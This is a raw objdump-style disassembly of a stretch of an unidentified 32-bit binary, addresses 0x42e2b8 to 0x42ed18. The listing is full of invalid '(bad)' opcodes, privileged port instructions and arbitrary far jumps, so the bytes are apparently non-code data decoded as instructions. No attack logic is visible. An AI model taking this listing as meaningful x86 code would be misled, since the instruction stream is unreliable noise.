  42e2b8:	fisub  DWORD PTR [esi-0x2743ed5c]
  42e2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2bf:	into   
  42e2c0:	clc    
	...
  42e331:	add    BYTE PTR [eax],al
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [eax],ebp
  42e341:	int    0x91
  42e343:	mov    ds:0x1e7f2,al
  42e348:	cmc    
  42e349:	add    BYTE PTR [eax],al
  42e34b:	add    al,bl
  42e34d:	add    eax,0x16128f05
  42e352:	(bad)  
  42e353:	in     eax,dx
  42e354:	xor    BYTE PTR [esi],dl
  42e356:	xor    ebp,DWORD PTR [ecx-0x78]
  42e359:	retf   0x875f
  42e35c:	jns    0x42e38a
  42e35e:	or     BYTE PTR [esi-0x4b],bh
  42e361:	adc    bl,dl
  42e363:	dec    edx
  42e364:	xchg   DWORD PTR [esi],ecx
  42e366:	mov    ebp,0x6ea12b1b
  42e36b:	fimul  DWORD PTR [esi+esi*8]
  42e36e:	and    al,0x6b
  42e370:	push   edx
  42e371:	mov    ch,0x43
  42e373:	ror    dh,1
  42e375:	xchg   DWORD PTR [ecx-0x17d7a1cc],eax
  42e37b:	sbb    bh,BYTE PTR [edx-0x4b13bdae]
  42e381:	sbb    BYTE PTR [esi-0x3b28a176],cl
  42e387:	lods   eax,DWORD PTR ds:[esi]
  42e388:	adc    al,0xb0
  42e38a:	xchg   esp,eax
  42e38b:	xchg   edi,ebp
  42e38d:	shl    dl,0x6e
  42e390:	jns    0x42e3aa
  42e392:	or     bl,0x42
  42e395:	xor    ah,BYTE PTR [eax-0x54]
  42e398:	mov    ds:0x59b67177,al
  42e39d:	and    al,0x6c
  42e39f:	and    bh,ah
  42e3a1:	data16 ja 0x42e3b0
  42e3a4:	jp     0x42e36d
  42e3a6:	rcr    DWORD PTR [eax],1
  42e3a8:	lock mov eax,ds:0xaaca5831
  42e3ae:	sub    al,0x88
  42e3b0:	cmp    BYTE PTR [ecx],bl
  42e3b2:	jp     0x42e3c1
  42e3b4:	push   es
  42e3b5:	stos   BYTE PTR es:[edi],al
  42e3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3b7:	add    eax,0x7fcc7f6d
  42e3bc:	ins    BYTE PTR es:[edi],dx
  42e3bd:	inc    ebp
  42e3be:	inc    ebp
  42e3bf:	pop    edi
  42e3c0:	outs   dx,DWORD PTR ds:[esi]
  42e3c1:	push   ds
  42e3c2:	and    DWORD PTR [edi-0x9],esi
  42e3c5:	and    eax,0x8327f6f8
  42e3ca:	xchg   BYTE PTR [edi],ch
  42e3cc:	mov    ebp,0x99ffa03a
  42e3d1:	jns    0x42e42e
  42e3d3:	xor    BYTE PTR [eax],bh
  42e3d5:	test   DWORD PTR [edx],esi
  42e3d7:	mov    ah,0xdc
  42e3d9:	add    eax,0xb6f5b59a
  42e3de:	aad    0x63
  42e3e0:	push   ecx
  42e3e1:	pop    es
  42e3e2:	dec    ecx
  42e3e3:	scas   al,BYTE PTR es:[edi]
  42e3e4:	xchg   ebp,eax
  42e3e5:	xlat   BYTE PTR ds:[ebx]
  42e3e6:	push   eax
  42e3e7:	ror    BYTE PTR [esi-0x65],cl
  42e3ea:	stos   DWORD PTR es:[edi],eax
  42e3eb:	(bad)  
  42e3ec:	std    
  42e3ed:	dec    esi
  42e3ee:	cmp    cl,BYTE PTR [ebx+0x4a]
  42e3f1:	pop    ebp
  42e3f2:	pop    ss
  42e3f3:	pop    ds
  42e3f4:	inc    esp
  42e3f5:	imul   edx,DWORD PTR [edi],0x77
  42e3f8:	test   BYTE PTR [ecx],0x8b
  42e3fb:	mov    al,ds:0xa6c8a4fd
  42e400:	call   0xef335ca1
  42e405:	repnz std 
  42e407:	rcl    DWORD PTR ds:0xf90e4fae,1
  42e40d:	pushf  
  42e40e:	sar    BYTE PTR [ebp-0x55],cl
  42e411:	cmp    esp,DWORD PTR [ecx+edi*2]
  42e414:	jbe    0x42e39e
  42e416:	lahf   
  42e417:	stos   DWORD PTR es:[edi],eax
  42e418:	mov    esp,0x32f9d651
  42e41d:	pusha  
  42e41e:	stc    
  42e41f:	inc    edx
  42e420:	hlt    
  42e421:	cmp    eax,0x31e2206a
  42e426:	push   edi
  42e427:	fwait
  42e428:	sbb    al,0xf2
  42e42a:	ret    0xc456
  42e42d:	stos   BYTE PTR es:[edi],al
  42e42e:	imul   edx,DWORD PTR [ebp-0x51],0xffffff9b
  42e432:	add    al,0xac
  42e434:	mov    dl,0x80
  42e436:	xor    DWORD PTR [ebp-0x18],esp
  42e439:	out    dx,eax
  42e43a:	jmp    0x7285:0x1621c8a9
	...
  42e4b1:	add    BYTE PTR [eax],al
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0x29193ad4
  42e4c4:	out    0xe8,eax
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	cmc    
  42e4c9:	add    BYTE PTR [eax],al
  42e4cb:	add    BYTE PTR [ebx-0x79],ah
  42e4ce:	and    al,0x16
  42e4d0:	pushf  
  42e4d1:	pop    esi
  42e4d2:	(bad)  {k6}{z}
  42e4d7:	out    dx,eax
  42e4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4d9:	xchg   DWORD PTR [esi],edi
  42e4db:	push   edi
  42e4dc:	(bad)  
  42e4dd:	enter  0x4dd6,0x8f
  42e4e1:	ins    BYTE PTR es:[edi],dx
  42e4e2:	jmp    0xe685:0x22547026
  42e4e9:	stos   BYTE PTR es:[edi],al
  42e4ea:	fimul  DWORD PTR [esp+ebx*1+0x82cba1c]
  42e4f1:	aas    
  42e4f2:	cmc    
  42e4f3:	xchg   ebx,eax
  42e4f4:	push   esi
  42e4f5:	gs fwait
  42e4f7:	cmp    DWORD PTR [ebp-0x2d654020],edi
  42e4fd:	mov    esp,0xef5d7a1a
  42e502:	gs add eax,0x4301af93
  42e508:	mov    esp,0xd22e7bf4
  42e50d:	les    ecx,FWORD PTR [ebx+0x1e0e7567]
  42e513:	sub    BYTE PTR [eax],dh
  42e515:	cs jge 0x42e4bd
  42e518:	leave  
  42e519:	mov    bl,0xf7
  42e51b:	in     al,0x47
  42e51d:	out    0x8b,eax
  42e51f:	inc    esp
  42e520:	mov    ds:0xf5d74ad9,al
  42e525:	pop    es
  42e526:	fsub   st(4),st
  42e528:	add    BYTE PTR [edi],bh
  42e52a:	sahf   
  42e52b:	in     al,0x82
  42e52d:	cmp    ecx,DWORD PTR [esi+0x20c24a06]
  42e533:	ret    0x6c05
  42e536:	sti    
  42e537:	sti    
  42e538:	xchg   edi,eax
  42e539:	mov    DWORD PTR [ebp-0x82cffb6],ebp
  42e53f:	sbb    al,0xac
  42e541:	(bad)  
  42e542:	into   
  42e543:	(bad)  
  42e544:	fucom  st(5)
  42e546:	lods   eax,DWORD PTR ds:[esi]
  42e547:	sar    BYTE PTR [ecx+0x3253e8d5],0xcb
  42e54e:	or     BYTE PTR [eax],al
  42e550:	mov    BYTE PTR [edi+0x5f28910a],ah
  42e556:	sbb    BYTE PTR [esi+0x658c5f11],ah
  42e55c:	callw  0xbd13
  42e560:	and    eax,0x69d91721
  42e565:	mov    ch,0xbf
  42e567:	mov    ?,ecx
  42e569:	jmp    0x8905:0x62457dff
  42e570:	mov    esi,0x81c2ee2e
  42e575:	out    0xf0,eax
  42e577:	jne    0x42e508
  42e579:	outs   dx,DWORD PTR ds:[esi]
  42e57a:	les    edx,FWORD PTR [esi+0x6c]
  42e57d:	inc    esi
  42e57e:	xor    DWORD PTR [ecx-0x150440cd],ebp
  42e584:	push   esp
  42e585:	xchg   ebp,eax
  42e586:	add    DWORD PTR [ebp-0xe4809b4],edi
  42e58c:	xor    al,0x13
  42e58e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e58f:	inc    edx
  42e590:	add    cl,ah
  42e592:	repz (bad) 
  42e596:	push   es
  42e597:	or     al,0x3a
  42e599:	stos   DWORD PTR es:[edi],eax
  42e59a:	aaa    
  42e59b:	mov    ah,ch
  42e59d:	pop    ebx
  42e59e:	je     0x42e542
  42e5a0:	or     al,0xe4
  42e5a2:	repnz retf 0xdcb1
  42e5a6:	jno    0x42e622
  42e5a8:	dec    esp
  42e5a9:	aas    
  42e5aa:	mov    eax,ds:0x9b408870
  42e5af:	adc    bh,bl
  42e5b1:	jbe    0x42e577
  42e5b3:	mov    ch,0x18
  42e5b5:	mov    eax,0xce6a7fb3
  42e5ba:	jo     0x42e565
  42e5bc:	jle    0x42e599
  42e5be:	shl    ebp,0x44
	...
  42e631:	add    BYTE PTR [eax],al
  42e633:	add    bl,dh
  42e635:	add    esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	pop    ecx
  42e641:	mov    WORD PTR [ecx+0x1e9dc3d],gs
  42e647:	add    ch,dh
  42e649:	add    BYTE PTR [eax],al
  42e64b:	add    dl,ah
  42e64d:	dec    ebx
  42e64e:	fcom   DWORD PTR [edi-0x677df926]
  42e654:	mov    gs:0xc6a4575b,al
  42e65a:	aas    
  42e65b:	icebp  
  42e65c:	cwde   
  42e65d:	js     0x42e64d
  42e65f:	sbb    esp,DWORD PTR [ebx+0x4f]
  42e662:	and    al,0x1d
  42e664:	(bad)  
  42e666:	or     al,0x5d
  42e668:	mov    eax,ds:0x16c5b6cd
  42e66d:	sbb    ah,BYTE PTR [edi]
  42e66f:	in     al,dx
  42e670:	mov    ecx,0xb9f6be4c
  42e675:	test   DWORD PTR [edx-0xddcf374],edx
  42e67b:	sub    eax,0x2c4037a7
  42e680:	push   0xe03762e0
  42e685:	out    0xca,eax
  42e687:	xor    esp,DWORD PTR [ebp-0x9]
  42e68a:	sub    DWORD PTR [esi-0x6b],ebp
  42e68d:	int    0x73
  42e68f:	jno    0x42e6b1
  42e691:	pop    esp
  42e692:	(bad)  
  42e693:	push   ebx
  42e694:	xor    al,0x8a
  42e696:	in     eax,0x7
  42e698:	(bad)  
  42e699:	xlat   BYTE PTR ds:[ebx]
  42e69a:	fwait
  42e69b:	lods   al,BYTE PTR ds:[esi]
  42e69c:	dec    ebx
  42e69d:	outs   dx,DWORD PTR ds:[esi]
  42e69e:	popa   
  42e69f:	mov    esi,0xc6fd082
  42e6a4:	jo     0x42e698
  42e6a6:	ret    
  42e6a7:	in     al,0x7c
  42e6a9:	mov    eax,ds:0xca8b4373
  42e6ae:	inc    esp
  42e6af:	shl    eax,0x34
  42e6b2:	(bad)  
  42e6b3:	cmp    edx,ebx
  42e6b5:	ja     0x42e702
  42e6b7:	xchg   edx,eax
  42e6b8:	js     0x42e72d
  42e6ba:	mov    edi,0xf7b9910e
  42e6bf:	mov    ebx,0x6ed38d13
  42e6c4:	imul   edx,DWORD PTR [edx],0x107ad4e3
  42e6ca:	fcmovb st,st(7)
  42e6cc:	mov    edi,0xe73377ba
  42e6d1:	or     eax,0x7310f12a
  42e6d6:	adc    esi,eax
  42e6d8:	jbe    0x42e746
  42e6da:	xor    ah,BYTE PTR [edx]
  42e6dc:	fst    DWORD PTR [edi+ecx*4]
  42e6df:	ja     0x42e6cb
  42e6e1:	inc    edx
  42e6e2:	xchg   esi,eax
  42e6e3:	sub    al,0xe3
  42e6e5:	loopne 0x42e677
  42e6e7:	add    BYTE PTR [esi-0x21e9759d],bl
  42e6ed:	xlat   BYTE PTR ds:[ebx]
  42e6ee:	mov    ebp,0xb7b3a211
  42e6f3:	mov    ecx,0x20cab63c
  42e6f8:	xor    DWORD PTR [ebx+ebx*4-0x43caef9a],edi
  42e6ff:	xchg   ecx,eax
  42e700:	mov    eax,ds:0x8ad60bb1
  42e705:	jp     0x42e772
  42e707:	xchg   ecx,eax
  42e708:	fdiv   DWORD PTR [esi-0x23093f]
  42e70e:	rcr    BYTE PTR [edi-0x8],0x2d
  42e712:	mov    eax,0x1c340e35
  42e717:	into   
  42e718:	cwde   
  42e719:	int3   
  42e71a:	iret   
  42e71b:	sar    BYTE PTR [edi],1
  42e71d:	ins    BYTE PTR es:[edi],dx
  42e71e:	stos   BYTE PTR es:[edi],al
  42e71f:	or     cl,BYTE PTR [ebx]
  42e721:	ss cli 
  42e723:	(bad)  
  42e724:	push   ss
  42e725:	cs fs or al,0xa
  42e729:	cmp    al,0xa4
  42e72b:	pop    ecx
  42e72c:	(bad)  
  42e72d:	inc    edx
  42e72e:	dec    ebx
  42e72f:	cmc    
  42e730:	jbe    0x42e6bd
  42e732:	or     BYTE PTR [ebx+edx*1-0x659a5481],bh
  42e739:	push   ds
  42e73a:	pop    ss
  42e73b:	jns    0x42e6c4
  42e73d:	sbb    al,0x79
  42e73f:	sub    ebp,DWORD PTR [edx]
	...
  42e7b1:	add    BYTE PTR [eax],al
  42e7b3:	add    BYTE PTR [esi-0x62a06765],dl
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi+0x610d5576]
  42e7c1:	cld    
  42e7c2:	xchg   esp,eax
  42e7c3:	sbb    al,0xd1
  42e7c5:	jmp    0x0:0xf50001
  42e7cc:	dec    ecx
  42e7cd:	mov    ds:0x8986c611,al
  42e7d2:	jo     0x42e7df
  42e7d4:	mov    ds:0x3a17a9cb,al
  42e7d9:	outs   dx,DWORD PTR ds:[esi]
  42e7da:	xchg   esi,eax
  42e7db:	outs   dx,BYTE PTR ds:[esi]
  42e7dc:	xchg   esp,eax
  42e7dd:	pushf  
  42e7de:	jno    0x42e7b7
  42e7e0:	push   0xd5346ffe
  42e7e5:	cmp    eax,0x65389033
  42e7ea:	(bad)  
  42e7eb:	in     al,dx
  42e7ec:	fsubr  st,st(2)
  42e7ee:	push   0x8813c734
  42e7f3:	mov    al,ds:0x85a51b60
  42e7f8:	jp     0x42e836
  42e7fa:	pushf  
  42e7fb:	sahf   
  42e7fc:	jl     0x42e77f
  42e7fe:	imul   ebx,DWORD PTR ss:[ebx],0x50
  42e802:	retf   0xa4ca
  42e805:	jge    0x42e81e
  42e807:	clc    
  42e808:	sub    al,0x24
  42e80a:	repnz push 0xfffffffe
  42e80d:	in     eax,dx
  42e80e:	jno    0x42e7fc
  42e810:	out    dx,al
  42e811:	and    al,0xde
  42e813:	add    BYTE PTR [ebx],bl
  42e815:	pop    es
  42e816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e817:	fst    QWORD PTR [ebp-0x73b7f217]
  42e81d:	push   eax
  42e81e:	sar    DWORD PTR [edi+0x676966bf],1
  42e824:	dec    DWORD PTR [edi+0x47]
  42e827:	jnp    0x42e7b9
  42e829:	in     al,0x3f
  42e82b:	push   esi
  42e82c:	jbe    0x42e7d0
  42e82e:	(bad)  
  42e830:	fs int3 
  42e832:	inc    edx
  42e833:	fld    QWORD PTR [eax]
  42e835:	sub    BYTE PTR [ecx+ebp*4+0x11],ah
  42e839:	xchg   DWORD PTR [ebx-0x7a3657a5],edi
  42e83f:	pop    es
  42e840:	jae    0x42e873
  42e842:	les    ecx,FWORD PTR [ecx-0x1dcba479]
  42e848:	inc    edx
  42e849:	push   es
  42e84a:	aad    0xd7
  42e84c:	imul   ebx,DWORD PTR [ebx-0x6036b878],0xf7bbbdd
  42e856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e857:	(bad)  
  42e858:	pop    ebx
  42e859:	fbld   TBYTE PTR [ecx+esi*4-0x61529c7]
  42e860:	jge    0x42e84a
  42e862:	call   0x439b:0x5f3233fd
  42e869:	(bad)  
  42e86a:	pushf  
  42e86b:	cmp    ah,BYTE PTR fs:[ebx-0x23ae7343]
  42e872:	lods   eax,DWORD PTR ds:[esi]
  42e873:	js     0x42e884
  42e875:	sti    
  42e876:	call   0x988f0cf
  42e87b:	icebp  
  42e87c:	add    BYTE PTR [ebp+0xbda19f4],bh
  42e882:	aaa    
  42e883:	jle    0x42e84e
  42e885:	push   cs
  42e886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e887:	popa   
  42e888:	repz pop edx
  42e88a:	or     ebp,0xffffffb7
  42e88d:	xor    bl,BYTE PTR [eax+edi*2-0x69]
  42e891:	scas   eax,DWORD PTR es:[edi]
  42e892:	add    ebx,DWORD PTR [ecx+0x18]
  42e895:	pushf  
  42e896:	in     al,dx
  42e897:	sub    esp,ecx
  42e899:	in     al,dx
  42e89a:	test   DWORD PTR [edx+0x7616ecc5],ebp
  42e8a0:	cwde   
  42e8a1:	add    bl,dh
  42e8a3:	cs sub eax,0xef9f97b8
  42e8a9:	mov    ds:0xf075f599,eax
  42e8ae:	test   al,0xef
  42e8b0:	arpl   WORD PTR [ebx+0x4a0ce19c],di
  42e8b6:	inc    esp
  42e8b7:	call   0x5861:0x7702b5aa
  42e8be:	inc    ecx
  42e8bf:	and    dl,ah
	...
  42e931:	add    BYTE PTR [eax],al
  42e933:	add    cl,bh
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0xba
  42e941:	cmp    BYTE PTR [edx+0x1ebc629],cl
  42e947:	add    ch,dh
  42e949:	add    BYTE PTR [eax],al
  42e94b:	add    BYTE PTR [ebx],dh
  42e94d:	xor    eax,0x4202af22
  42e952:	and    DWORD PTR [ebp-0x2e],ebp
  42e955:	dec    ecx
  42e956:	push   esi
  42e957:	popa   
  42e958:	enter  0xff04,0x10
  42e95c:	push   ss
  42e95d:	push   cs
  42e95e:	sti    
  42e95f:	inc    edx
  42e960:	aad    0x1
  42e962:	xor    ah,ah
  42e964:	pop    esi
  42e965:	dec    edx
  42e966:	adc    al,0x73
  42e968:	push   es
  42e969:	dec    esi
  42e96a:	adc    BYTE PTR [eax+0x7b],0x9f
  42e96e:	sub    DWORD PTR [eax-0x40041420],edx
  42e974:	inc    esi
  42e975:	(bad)  
  42e976:	lahf   
  42e977:	push   ds
  42e978:	pop    esi
  42e979:	pop    edi
  42e97a:	mov    al,ds:0x22195981
  42e97f:	cmp    eax,0x97004f66
  42e984:	sbb    eax,0xb3bffdc0
  42e989:	jne    0x42e922
  42e98b:	and    eax,0xb2a408c8
  42e990:	test   BYTE PTR [ebx],ah
  42e992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e993:	add    al,0xa4
  42e995:	sub    eax,0xd3ad5945
  42e99a:	rcl    DWORD PTR [ebx-0x1cd251fe],1
  42e9a0:	inc    ebp
  42e9a1:	push   esp
  42e9a2:	or     esp,DWORD PTR [eax+0x7b]
  42e9a5:	clc    
  42e9a6:	push   es
  42e9a7:	jnp    0x42e9fb
  42e9a9:	inc    edx
  42e9aa:	sahf   
  42e9ab:	out    dx,eax
  42e9ac:	sbb    edi,DWORD PTR ds:0x347d8f4a
  42e9b2:	int3   
  42e9b3:	(bad)  
  42e9b4:	jl     0x42e9ed
  42e9b6:	cwde   
  42e9b7:	push   ebp
  42e9b8:	jne    0x42e960
  42e9ba:	cmp    DWORD PTR ds:0x8d0578fa,ecx
  42e9c0:	cmp    al,0x43
  42e9c2:	test   al,0xcd
  42e9c4:	sbb    BYTE PTR [eax+0x652f0ac0],dh
  42e9ca:	(bad)  
  42e9cb:	fs xchg ebp,eax
  42e9cd:	sbb    cl,BYTE PTR [eax+0x43d0dc21]
  42e9d3:	xor    eax,0x11725555
  42e9d8:	ror    BYTE PTR [edx],cl
  42e9da:	xchg   BYTE PTR [ebx],dl
  42e9dc:	lock aam 0x79
  42e9df:	push   eax
  42e9e0:	add    DWORD PTR [eax+0x1d],0xe9394f12
  42e9e7:	faddp  st(5),st
  42e9e9:	stc    
  42e9ea:	(bad)  
  42e9eb:	xchg   edi,eax
  42e9ec:	or     DWORD PTR [ecx+edi*1-0x7c8da7c9],edi
  42e9f3:	pop    esp
  42e9f4:	or     esi,DWORD PTR [ecx+eiz*4]
  42e9f7:	xchg   esp,eax
  42e9f8:	and    eax,0xe250e485
  42e9fd:	(bad)  
  42e9fe:	clc    
  42e9ff:	loopne 0x42ea00
  42ea01:	mov    eax,ds:0x7640a414
  42ea06:	loope  0x42e99a
  42ea08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea09:	pusha  
  42ea0a:	jmp    0x8d50:0x2c4066d0
  42ea11:	setno  dh
  42ea14:	ja     0x42e9ed
  42ea16:	out    0xdc,eax
  42ea18:	(bad)  
  42ea19:	jns    0x42e9c5
  42ea1b:	mov    esp,ecx
  42ea1d:	mov    al,ds:0xd4e221f3
  42ea22:	call   0xcc34:0x9b31cd5e
  42ea29:	pop    eax
  42ea2a:	test   eax,0x8c799d24
  42ea2f:	pop    esp
  42ea30:	mov    WORD PTR [esi],ss
  42ea32:	inc    ebx
  42ea33:	add    eax,0xf22a908a
  42ea38:	sbb    BYTE PTR [ebx+0x29d32e38],dh
  42ea3e:	pop    ds
  42ea3f:	ror    BYTE PTR [ecx+0x0],0x0
	...
  42eab3:	add    BYTE PTR [eax-0x2093e086],dh
  42eab9:	ins    DWORD PTR es:[edi],dx
  42eaba:	repz dec BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	push   ebp
  42eac1:	cmp    eax,0xecbb0af2
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	cmc    
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    BYTE PTR [edi+ecx*4-0xf],ah
  42eacf:	aas    
  42ead0:	leave  
  42ead1:	test   al,0xb8
  42ead3:	int    0x87
  42ead5:	mov    ebp,cs
  42ead7:	inc    esi
  42ead8:	xchg   esi,eax
  42ead9:	lock mov WORD PTR [esi],ss
  42eadc:	push   esp
  42eadd:	adc    eax,0xcd4b7ddd
  42eae2:	sub    eax,0x935e4bd0
  42eae7:	and    al,0x90
  42eae9:	mov    ds:0xc8bd2293,eax
  42eaee:	add    eax,0xe712cd50
  42eaf3:	cwde   
  42eaf4:	add    ch,cl
  42eaf6:	sub    DWORD PTR [edi+ebp*8-0x23],ebx
  42eafa:	fsubrp st(5),st
  42eafc:	lock sar esp,1
  42eaff:	mov    al,0x7e
  42eb01:	pop    esp
  42eb02:	scas   al,BYTE PTR es:[edi]
  42eb03:	aad    0xa3
  42eb05:	mov    BYTE PTR [ebp+0x68],ch
  42eb08:	mov    al,0x1a
  42eb0a:	push   ebp
  42eb0b:	mov    ecx,0xa0093ff8
  42eb10:	jge    0x42eb07
  42eb12:	sbb    al,0x6c
  42eb14:	add    al,0x9b
  42eb16:	loop   0x42eb6d
  42eb18:	or     al,0x8e
  42eb1a:	cld    
  42eb1b:	or     cl,0x6
  42eb1e:	mov    dl,0x7b
  42eb20:	xchg   ebp,eax
  42eb21:	jne    0x42eb44
  42eb23:	test   DWORD PTR [edx+eax*2-0x49],eax
  42eb27:	imul   esi,ebp,0x5b
  42eb2a:	inc    esp
  42eb2b:	(bad)  
  42eb2c:	xor    al,0xdf
  42eb2e:	or     al,0x5e
  42eb30:	pop    eax
  42eb31:	push   ebx
  42eb32:	adc    eax,0xa574755b
  42eb37:	cmp    esp,edi
  42eb39:	push   es
  42eb3a:	pushf  
  42eb3b:	pop    edi
  42eb3c:	and    DWORD PTR [edx],edi
  42eb3e:	inc    edi
  42eb3f:	cdq    
  42eb40:	(bad)  
  42eb41:	jle    0x42eb74
  42eb43:	sbb    dl,BYTE PTR [edx-0x1b]
  42eb46:	fisubr WORD PTR [ecx-0x3b509c61]
  42eb4c:	pop    esi
  42eb4d:	pusha  
  42eb4e:	mov    ds:0xcad841b,al
  42eb53:	int    0xd0
  42eb55:	or     al,dh
  42eb57:	ficom  WORD PTR [edi]
  42eb59:	adc    ecx,DWORD PTR [ebx+ecx*1-0x5f60b947]
  42eb60:	inc    ecx
  42eb61:	js     0x42eba6
  42eb63:	loope  0x42eb63
  42eb65:	sbb    BYTE PTR [eax],ah
  42eb67:	pop    ebp
  42eb68:	das    
  42eb69:	outs   dx,DWORD PTR ds:[esi]
  42eb6a:	and    BYTE PTR [eax+0x12],0xb6
  42eb6e:	out    0x35,eax
  42eb70:	std    
  42eb71:	outs   dx,DWORD PTR ds:[esi]
  42eb72:	sti    
  42eb73:	add    al,0x48
  42eb75:	rcr    al,0x6c
  42eb78:	cdq    
  42eb79:	sbb    cl,BYTE PTR [eax-0x305c037f]
  42eb7f:	dec    ebx
  42eb80:	jo     0x42eb75
  42eb82:	cmp    DWORD PTR [edi+ebx*8+0x70cd08c1],ebp
  42eb89:	adc    eax,0x486694d2
  42eb8e:	ss je  0x42eb83
  42eb91:	lock lahf 
  42eb93:	pop    eax
  42eb94:	ret    0x24a6
  42eb97:	xchg   ebx,eax
  42eb98:	ss dec ebx
  42eb9a:	pusha  
  42eb9b:	stos   BYTE PTR es:[edi],al
  42eb9c:	cmp    al,0xf7
  42eb9e:	or     al,0x19
  42eba0:	pushf  
  42eba1:	lock ins DWORD PTR es:[edi],dx
  42eba3:	dec    ebx
  42eba4:	fadd   st(3),st
  42eba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eba7:	mov    edi,0x5bc460e0
  42ebac:	and    eax,0x35227f10
  42ebb1:	xor    DWORD PTR [edi-0x391235a6],edi
  42ebb7:	fst    QWORD PTR [edi]
  42ebb9:	xchg   esp,eax
  42ebba:	jge    0x42eb68
  42ebbc:	dec    ebp
  42ebbd:	jecxz  0x42ebad
  42ebbf:	into   
  42ebc0:	inc    ebp
	...
  42ec31:	add    BYTE PTR [eax],al
  42ec33:	add    BYTE PTR [ecx],bh
  42ec35:	mov    bh,0x6d
  42ec37:	pxor   mm3,mm7
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4-0x56d1b797]
  42ec43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec44:	mov    al,0xed
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	cmc    
  42ec49:	add    BYTE PTR [eax],al
  42ec4b:	add    BYTE PTR [edx+0x7524fea8],cl
  42ec51:	jbe    0x42ec65
  42ec53:	js     0x42ecad
  42ec55:	outs   dx,BYTE PTR ss:[esi]
  42ec57:	jl     0x42ec6c
  42ec59:	call   0x6550:0xa37ec501
  42ec60:	sbb    dl,BYTE PTR [esi+ebp*8-0x12]
  42ec64:	cmp    BYTE PTR [ebp+0x43],dh
  42ec67:	push   ebx
  42ec68:	cdq    
  42ec69:	cmp    al,0x4e
  42ec6b:	into   
  42ec6c:	mov    ds:0xd46708bb,eax
  42ec71:	push   ecx
  42ec72:	xor    al,0x58
  42ec74:	das    
  42ec75:	or     BYTE PTR ss:[ebp+0x2d],cl
  42ec79:	or     DWORD PTR [edx],esp
  42ec7b:	gs call 0x7f0c6f76
  42ec81:	pop    eax
  42ec82:	imul   ebx,DWORD PTR [ecx+0x21],0x4f2769a9
  42ec89:	mov    edi,0x127f6e73
  42ec8e:	dec    ebp
  42ec8f:	in     al,dx
  42ec90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec91:	(bad)  [esi+edi*8+0xc990c0e]
  42ec98:	in     al,dx
  42ec99:	mov    edx,0xd39b1caa
  42ec9e:	jp     0x42eca8
  42eca0:	in     eax,0x26
  42eca2:	xchg   ebx,eax
  42eca3:	lahf   
  42eca4:	aam    0xa
  42eca6:	aad    0x8e
  42eca8:	enter  0xa136,0xde
  42ecac:	test   eax,0xe02a8080
  42ecb1:	push   ebp
  42ecb2:	or     al,0xe8
  42ecb4:	pop    ebx
  42ecb5:	bound  ebp,QWORD PTR [esi-0x1b]
  42ecb8:	sbb    BYTE PTR [edi+0x7c],bh
  42ecbb:	cs push esi
  42ecbd:	lods   al,BYTE PTR ds:[esi]
  42ecbe:	fsub   DWORD PTR [edi]
  42ecc0:	cmc    
  42ecc1:	js     0x42ed37
  42ecc3:	inc    edx
  42ecc4:	enter  0x7a16,0x2a
  42ecc8:	and    DWORD PTR [ebx+ecx*2-0x6],edx
  42eccc:	ins    BYTE PTR es:[edi],dx
  42eccd:	test   al,0x69
  42eccf:	jmp    0x7a26b9b6
  42ecd4:	jb     0x42eca6
  42ecd6:	outs   dx,BYTE PTR ds:[esi]
  42ecd7:	cmp    DWORD PTR [ebx],ebp
  42ecd9:	loope  0x42ed1a
  42ecdb:	(bad)  
  42ecdc:	aad    0x1f
  42ecde:	ret    0x575e
  42ece1:	jecxz  0x42ec73
  42ece3:	or     al,0x4
  42ece5:	sbb    ebp,esi
  42ece7:	mov    ebx,0x8f3678a
  42ecec:	or     BYTE PTR [edx+0x15],ah
  42ecef:	in     eax,0x10
  42ecf1:	xchg   ecx,eax
  42ecf2:	aas    
  42ecf3:	push   eax
  42ecf4:	daa    
  42ecf5:	fisub  DWORD PTR [edx+0x6ea3ac63]
  42ecfb:	and    dl,dl
  42ecfd:	sbb    WORD PTR [ebx-0x6b],0xffe2
  42ed02:	sbb    BYTE PTR [esi+0x46],dh
  42ed05:	cli    
  42ed06:	jmp    0x42ed5f
  42ed08:	cmp    bh,BYTE PTR [edx]
  42ed0a:	mov    ebp,DWORD PTR ss:[edi+0xf60c1ac]
  42ed11:	mov    WORD PTR [ecx+0x43],fs
  42ed14:	pop    ds
  42ed15:	pop    edi
  42ed16:	out    0xcd,eax
  42ed18:	shr    BYTE PTR [ebx+0x7a9a5898],1
